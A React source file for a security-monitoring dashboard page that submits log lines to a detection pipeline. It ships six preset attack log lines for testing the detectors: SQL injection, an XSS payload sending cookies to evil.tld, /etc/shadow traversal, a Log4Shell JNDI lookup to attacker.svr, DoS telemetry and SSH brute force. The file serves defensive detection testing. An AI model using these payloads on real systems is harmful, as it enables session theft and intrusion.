import React, { useState } from "react";
import { Terminal, Play, Sparkles, Layers, CheckCircle2 } from "lucide-react";

interface LogIngestionPageProps {
  apiBase: string;
  authHeaders: () => Record<string, string>;
  onRefresh: () => void;
  notify: (msg: string, type?: "info" | "success" | "error") => void;
}

const ATTACK_PRESETS: Array<{ label: string; category: string; line: string }> = [
  {
    label: "SQL Injection (UNION)",
    category: "Signature + Web Brain",
    line: `203.0.113.45 - - [22/Oct/2026:12:40:01 +0000] "GET /products?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 1420`,
  },
  {
    label: "XSS Script Payload",
    category: "Signature + Web Brain",
    line: `198.51.100.23 - - [22/Oct/2026:12:41:10 +0000] "GET /search?q=<script>fetch('http://evil.tld/steal?c='+document.cookie)</script> HTTP/1.1" 200 890`,
  },
  {
    label: "Path Traversal (/etc/shadow)",
    category: "Critical LFI",
    line: `192.0.2.88 - - [22/Oct/2026:12:42:15 +0000] "GET /download?file=../../../../etc/shadow HTTP/1.1" 403 210`,
  },
  {
    label: "Log4Shell JNDI Exploit",
    category: "Critical RCE",
    line: `203.0.113.99 - - [22/Oct/2026:12:43:00 +0000] "GET /?x=\${jndi:ldap://attacker.svr/exp} HTTP/1.1" 500 512`,
  },
  {
    label: "AI DoS Flood Telemetry",
    category: "ML DoS Brain",
    line: `198.51.100.77 - GET /login?dport=80&dur=1500&fpkts=85&bpkts=60&byte_rate=750000.0 HTTP/1.1`,
  },
  {
    label: "SSH Root Brute Force",
    category: "Auth Brain",
    line: `Failed password for root from 203.0.113.200 port 51234 ssh2`,
  },
];

export const LogIngestionPage: React.FC<LogIngestionPageProps> = ({
  apiBase,
  authHeaders,
  onRefresh,
  notify,
}) => {
  const [logInput, setLogInput] = useState(ATTACK_PRESETS[0].line);
  const [batchMode, setBatchMode] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [lastResult, setLastResult] = useState<{
    linesProcessed: number;
    alertsTriggered: number;
    types: string[];
  } | null>(null);

  const handleIngest = async () => {
    const raw = logInput.trim();
    if (!raw) {
      notify("Please enter at least one log line", "info");
      return;
    }

    setSubmitting(true);
    try {
      const lines = raw
        .split(/\r?\n/)
        .map((l) => l.trim())
        .filter(Boolean);

      if (batchMode || lines.length > 1) {
        const resp = await fetch(`${apiBase}/api/logs/batch`, {
          method: "POST",
          headers: authHeaders(),
          body: JSON.stringify({ lines, source: "soc-sandbox-batch" }),
        });
        if (!resp.ok) {
          const err = await resp.json().catch(() => ({}));
          throw new Error(err.detail || "Batch ingestion failed");
        }
        const data = await resp.json();
        const detectedTypes: string[] = [];
        for (const r of data.results || []) {
          for (const a of r.alerts || []) {
            if (a.Type) detectedTypes.push(a.Type);
          }
        }
        setLastResult({
          linesProcessed: data.line_count || lines.length,
          alertsTriggered: data.alert_count || 0,
          types: [...new Set(detectedTypes)],
        });
        notify(
          `Processed ${lines.length} log lines — ${data.alert_count || 0} alert(s) triggered`,
          data.alert_count > 0 ? "success" : "info"
        );
      } else {
        const resp = await fetch(`${apiBase}/api/logs`, {
          method: "POST",
          headers: authHeaders(),
          body: JSON.stringify({ line: lines[0], source: "soc-sandbox" }),
        });
        if (!resp.ok) {
          const err = await resp.json().catch(() => ({}));
          throw new Error(err.detail || "Log ingestion failed");
        }
        const data = await resp.json();
        const detectedTypes = (data.alerts || []).map((a: { Type: string }) => a.Type);
        setLastResult({
          linesProcessed: 1,
          alertsTriggered: data.alert_count || 0,
          types: detectedTypes,
        });
        notify(
          data.alert_count > 0
            ? `Alert triggered: ${detectedTypes.join(", ")}`
            : "Log evaluated as benign (0 alerts)",
          data.alert_count > 0 ? "success" : "info"
        );
      }
      onRefresh();
    } catch (err: unknown) {
      notify(err instanceof Error ? err.message : "Failed to submit log", "error");
    } finally {
      setSubmitting(false);
    }
  };

  const loadAllPresetsAsBatch = () => {
    setBatchMode(true);
    setLogInput(ATTACK_PRESETS.map((p) => p.line).join("\n"));
    notify("Loaded 6 multi-vector attack simulations into batch sandbox", "info");
  };

  return (
    <div className="tab-page">
      <div className="double-grid">
        {/* Left: Interactive Log Sandbox */}
        <div className="panel">
          <div className="panel-header">
            <div>
              <h2>Live Telemetry &amp; Attack Simulation Sandbox</h2>
              <p className="panel-subtext">
                Inject single or multi-line log payloads directly into the Signature + 7-Brain ML pipeline
              </p>
            </div>
            <span className="panel-note">Admin Sandbox</span>
          </div>

          <div className="sandbox-mode-bar">
            <button
              type="button"
              className={`chip-btn ${!batchMode ? "active" : ""}`}
              onClick={() => setBatchMode(false)}
            >
              <Terminal size={13} /> Single Log Line
            </button>
            <button
              type="button"
              className={`chip-btn ${batchMode ? "active" : ""}`}
              onClick={() => setBatchMode(true)}
            >
              <Layers size={13} /> Multi-Line Batch Mode
            </button>
            <button
              type="button"
              className="chip-btn"
              style={{ marginLeft: "auto" }}
              onClick={loadAllPresetsAsBatch}
            >
              <Sparkles size={13} /> Load Full Attack Suite (6 Vectors)
            </button>
          </div>

          <textarea
            className="textarea"
            style={{ height: batchMode ? 210 : 140 }}
            spellCheck={false}
            value={logInput}
            onChange={(e) => setLogInput(e.target.value)}
            placeholder="Paste Apache/Nginx access log, SSH auth log, or CIC-IDS telemetry string..."
          />

          <div className="panel-actions" style={{ justifyContent: "space-between", alignItems: "center" }}>
            <span className="mono text-dim" style={{ fontSize: 12 }}>
              {logInput.trim() ? `${logInput.trim().split(/\r?\n/).length} line(s) staged` : "Empty buffer"}
            </span>
            <div style={{ display: "flex", gap: 12 }}>
              <button
                type="button"
                className="button button-secondary"
                onClick={() => {
                  setLogInput("");
                  setLastResult(null);
                }}
              >
                Clear
              </button>
              <button
                type="button"
                className="button button-primary"
                disabled={submitting}
                onClick={handleIngest}
                style={{ display: "flex", alignItems: "center", gap: 8 }}
              >
                <Play size={15} />
                {submitting ? "Evaluating Payload..." : "Execute Detection Pipeline"}
              </button>
            </div>
          </div>

          {lastResult && (
            <div className="sandbox-result-banner">
              <CheckCircle2 size={18} className={lastResult.alertsTriggered > 0 ? "critical" : "low"} />
              <div>
                <strong>
                  Evaluated {lastResult.linesProcessed} line(s) → {lastResult.alertsTriggered} threat alert(s) generated
                </strong>
                {lastResult.types.length > 0 && (
                  <div className="mitre-tags" style={{ marginTop: 6 }}>
                    {lastResult.types.map((t) => (
                      <span key={t} className="severity-pill critical">
                        {t}
                      </span>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>

        {/* Right: One-Click Attack Vector Presets */}
        <div className="panel">
          <div className="panel-header">
            <div>
              <h2>Attack Vector Library</h2>
              <p className="panel-subtext">
                Select a curated adversarial payload to test heuristic and ML brain responsiveness
              </p>
            </div>
            <span className="panel-note">6 Presets</span>
          </div>

          <div className="preset-cards-grid">
            {ATTACK_PRESETS.map((preset) => (
              <div
                key={preset.label}
                className="preset-card"
                onClick={() => {
                  setBatchMode(false);
                  setLogInput(preset.line);
                }}
              >
                <div className="preset-card-top">
                  <strong>{preset.label}</strong>
                  <span className="mitre-tag">{preset.category}</span>
                </div>
                <code className="preset-code-preview">{preset.line}</code>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};
